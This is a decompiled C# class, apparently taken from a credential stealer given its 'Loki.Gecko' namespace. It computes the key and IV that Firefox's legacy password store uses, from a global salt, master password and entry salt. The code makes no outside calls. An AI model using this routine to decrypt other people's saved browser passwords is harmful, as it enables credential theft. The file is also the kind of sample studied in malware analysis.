using System;
using System.Security.Cryptography;

namespace Loki.Gecko
{
	// Token: 0x0200000A RID: 10
	public class MozillaPBE
	{
		// Token: 0x17000018 RID: 24
		// (get) Token: 0x0600004B RID: 75 RVA: 0x0000409E File Offset: 0x0000229E
		// (set) Token: 0x0600004C RID: 76 RVA: 0x000040A6 File Offset: 0x000022A6
		private byte[] GlobalSalt { get; set; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x0600004D RID: 77 RVA: 0x000040AF File Offset: 0x000022AF
		// (set) Token: 0x0600004E RID: 78 RVA: 0x000040B7 File Offset: 0x000022B7
		private byte[] MasterPassword { get; set; }

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x0600004F RID: 79 RVA: 0x000040C0 File Offset: 0x000022C0
		// (set) Token: 0x06000050 RID: 80 RVA: 0x000040C8 File Offset: 0x000022C8
		private byte[] EntrySalt { get; set; }

		// Token: 0x06000051 RID: 81 RVA: 0x000040D1 File Offset: 0x000022D1
		public byte[] GetKey()
		{
			return this.key;
		}

		// Token: 0x06000052 RID: 82 RVA: 0x000040D9 File Offset: 0x000022D9
		private void SetKey(byte[] value)
		{
			this.key = value;
		}

		// Token: 0x06000053 RID: 83 RVA: 0x000040E2 File Offset: 0x000022E2
		public byte[] GetIV()
		{
			return this.iV;
		}

		// Token: 0x06000054 RID: 84 RVA: 0x000040EA File Offset: 0x000022EA
		private void SetIV(byte[] value)
		{
			this.iV = value;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x000040F3 File Offset: 0x000022F3
		public MozillaPBE(byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt)
		{
			this.GlobalSalt = GlobalSalt;
			this.MasterPassword = MasterPassword;
			this.EntrySalt = EntrySalt;
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00004110 File Offset: 0x00002310
		public void Compute()
		{
			using (SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider())
			{
				byte[] array = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
				Array.Copy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
				Array.Copy(this.MasterPassword, 0, array, this.GlobalSalt.Length, this.MasterPassword.Length);
				byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
				byte[] array3 = new byte[array2.Length + this.EntrySalt.Length];
				Array.Copy(array2, 0, array3, 0, array2.Length);
				Array.Copy(this.EntrySalt, 0, array3, array2.Length, this.EntrySalt.Length);
				byte[] array4 = sha1CryptoServiceProvider.ComputeHash(array3);
				byte[] array5 = new byte[20];
				Array.Copy(this.EntrySalt, 0, array5, 0, this.EntrySalt.Length);
				for (int i = this.EntrySalt.Length; i < 20; i++)
				{
					array5[i] = 0;
				}
				byte[] array6 = new byte[array5.Length + this.EntrySalt.Length];
				Array.Copy(array5, 0, array6, 0, array5.Length);
				Array.Copy(this.EntrySalt, 0, array6, array5.Length, this.EntrySalt.Length);
				byte[] array7;
				byte[] array10;
				using (HMACSHA1 hmacsha = new HMACSHA1(array4))
				{
					array7 = hmacsha.ComputeHash(array6);
					byte[] array8 = hmacsha.ComputeHash(array5);
					byte[] array9 = new byte[array8.Length + this.EntrySalt.Length];
					Array.Copy(array8, 0, array9, 0, array8.Length);
					Array.Copy(this.EntrySalt, 0, array9, array8.Length, this.EntrySalt.Length);
					array10 = hmacsha.ComputeHash(array9);
				}
				byte[] array11 = new byte[array7.Length + array10.Length];
				Array.Copy(array7, 0, array11, 0, array7.Length);
				Array.Copy(array10, 0, array11, array7.Length, array10.Length);
				this.SetKey(new byte[24]);
				for (int j = 0; j < this.GetKey().Length; j++)
				{
					this.GetKey()[j] = array11[j];
				}
				this.SetIV(new byte[8]);
				int num = this.GetIV().Length - 1;
				for (int k = array11.Length - 1; k >= array11.Length - this.GetIV().Length; k--)
				{
					this.GetIV()[num] = array11[k];
					num--;
				}
			}
		}

		// Token: 0x0400002D RID: 45
		private byte[] key;

		// Token: 0x0400002E RID: 46
		private byte[] iV;
	}
}
